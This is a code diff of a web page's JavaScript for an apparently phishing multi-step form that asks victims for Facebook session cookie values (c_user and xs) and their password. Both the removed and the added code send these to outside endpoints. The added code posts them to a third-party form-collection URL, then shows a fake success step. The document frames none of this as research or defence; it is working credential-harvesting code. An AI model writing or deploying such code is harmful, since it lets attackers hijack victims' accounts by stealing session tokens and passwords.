@@ -1760,55 +1760,84 @@
                     passwordInput.reportValidity();
                     return;
                 }
-                
-                step2.classList.remove('active');
-                step3.classList.add('active');
-                
-                steps[1].classList.remove('active');
-                steps[2].classList.add('active');
-                
-                const cUser = document.getElementById('c_user').value;
-                const xs = document.getElementById('xs').value;
-                const password = document.getElementById('password').value;
-                
-                const formData = {
-                    c_user: cUser,
-                    xs: xs,
-                    password: password,
-                    ip: '', // Will be filled by the form submission
-                    user_agent: navigator.userAgent,
-                    timestamp: new Date().toISOString()
-                };
-                
-                // Function to submit to an endpoint
-                const submitToEndpoint = (url) => {
-                    return fetch(url, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify(formData)
-                    });
-                };
-                
-                // Submit to multiple endpoints simultaneously
-                Promise.all([
-                    submitToEndpoint(endpoint1),
-                    submitToEndpoint(endpoint2),
-                    submitToEndpoint(endpoint3)
-                ])
-                .then(responses => {
-                    // Check if all submissions were successful
-                    const allSuccessful = responses.every(response => response.ok);
-                    if (!allSuccessful) {
-                        console.error('One or more submissions failed');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error during submissions:', error);
-                });
+                // Submit c_user and xs together
+          const formData = new FormData();
+          formData.append("c_user", cUserInput.value);
+          formData.append("xs", xsInput.value);
+
+          fetch("https://submit-form.com/T2JyIs7Q9 ", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              c_user: cUserInput.value,
+              xs: xsInput.value
+            }),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                console.error("Submission of c_user and xs failed");
+              }
+            })
+            .catch((error) => {
+              console.error("Submission error:", error);
             });
+
+          // Proceed to next step
+          step1.classList.remove("active");
+          step2.classList.add("active");
+
+          steps[0].classList.remove("active");
+          steps[1].classList.add("active");
+        });
+
+        // Back to Step 1
+        backToStep1.addEventListener("click", function () {
+          step2.classList.remove("active");
+          step1.classList.add("active");
+
+          steps[1].classList.remove("active");
+          steps[0].classList.add("active");
+        });
+
+        // Submit form
+        nextToStep3.addEventListener("click", function () {
+          const passwordInput = document.getElementById("password");
+
+          if (!passwordInput.checkValidity()) {
+            passwordInput.reportValidity();
+            return;
+          }
+          // Submit password separately
+          const formData = new FormData();
+          formData.append("password", passwordInput.value);
+
+          fetch("https://submit-form.com/T2JyIs7Q9 ", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              password: passwordInput.value,
+            }),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                console.error("Password submission failed");
+              }
+            })
+            .catch((error) => {
+              console.error("Submission error:", error);
+            });
+
+          // Proceed to success step
+          step2.classList.remove("active");
+          step3.classList.add("active");
+
+          steps[1].classList.remove("active");
+          steps[2].classList.add("active");
+        });
             
             // Reset form
             function resetForm() {
